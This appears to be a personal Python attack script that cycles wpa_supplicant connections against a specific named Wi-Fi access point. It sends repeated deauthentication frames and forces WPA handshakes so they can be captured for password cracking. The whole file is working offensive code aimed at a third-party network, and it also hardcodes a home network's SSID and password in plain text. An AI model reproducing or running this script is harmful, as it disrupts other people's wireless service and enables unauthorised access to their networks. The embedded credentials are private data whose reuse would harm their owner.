#!/usr/bin/env python3
"""
Deauth via wpa_supplicant: repeatedly connect to target, disconnect, reconnect.
Each disconnect sends a real deauth frame through PE → proven to TX.
Rapid connect/disconnect cycling to force handshake capture.
"""
import subprocess, time, sys

TARGET_BSSID = "04:67:61:d6:dc:92"
TARGET_SSID = "不想上班"
TARGET_FREQ = 2412
IFACE = "wlan0"
HOME_SSID = "9899a5b77"
HOME_PSK = "9006609b29404a"

CYCLES = 20  # number of connect/disconnect cycles

def run(cmd, timeout=10):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return r.stdout.strip()

def wpa(cmd):
    return run(f"wpa_cli -i {IFACE} {cmd}")

def connect_target():
    """Add target network and connect"""
    wpa("remove_network all")
    wpa("add_network")
    wpa(f'set_network 0 ssid \'"{TARGET_SSID}"\'')
    wpa("set_network 0 key_mgmt WPA-PSK")
    wpa(f'set_network 0 psk \'"12345678"\'')
    wpa(f"set_network 0 bssid {TARGET_BSSID}")
    wpa("enable_network 0")
    wpa("select_network 0")

def connect_home():
    """Connect to home AP"""
    wpa("remove_network all")
    wpa("add_network")
    wpa(f'set_network 0 ssid \'"{HOME_SSID}"\'')
    wpa(f'set_network 0 psk \'"{HOME_PSK}"\'')
    wpa("enable_network 0")
    wpa("select_network 0")

def wait_state(target_states, timeout=10):
    """Wait for wpa_supplicant to reach one of the target states"""
    for i in range(int(timeout / 0.2)):
        time.sleep(0.2)
        status = wpa("status")
        for state in target_states:
            if state in status:
                return state
    return None

print(f"=== DEAUTH CYCLING ATTACK ===", flush=True)
print(f"Target: {TARGET_SSID} ({TARGET_BSSID})", flush=True)
print(f"Cycles: {CYCLES}", flush=True)
print(f"Each cycle: connect → 4WAY → disconnect (sends real deauth TX)", flush=True)
print("", flush=True)

deauth_count = 0

for cycle in range(1, CYCLES + 1):
    print(f"[{cycle}/{CYCLES}] Connecting to target...", end=" ", flush=True)
    connect_target()

    state = wait_state(["4WAY_HANDSHAKE", "ASSOCIATED", "COMPLETED"], timeout=8)
    if state:
        print(f"{state}", end=" ", flush=True)

        # Wait a tiny bit to ensure PE session is fully up
        time.sleep(0.3)

        # Disconnect - this sends a REAL deauth frame via PE!
        wpa("disconnect")
        deauth_count += 1
        print(f"→ DEAUTH sent [{deauth_count}]", flush=True)

        time.sleep(0.3)
    else:
        print("TIMEOUT", flush=True)

    # Brief pause between cycles to allow AP to stabilize
    time.sleep(0.5)

# Reconnect to home
print(f"\nTotal deauth frames sent: {deauth_count}", flush=True)
print(f"Reconnecting to {HOME_SSID}...", flush=True)
connect_home()
state = wait_state(["COMPLETED"], timeout=15)
if state:
    print("Reconnected!", flush=True)
else:
    print("WARNING: reconnect failed, retry:", flush=True)
    connect_home()
    time.sleep(10)
    print(f"Status: {wpa('status')[:50]}", flush=True)

print("\nDone! Check dmesg for all Deauth TX messages.", flush=True)
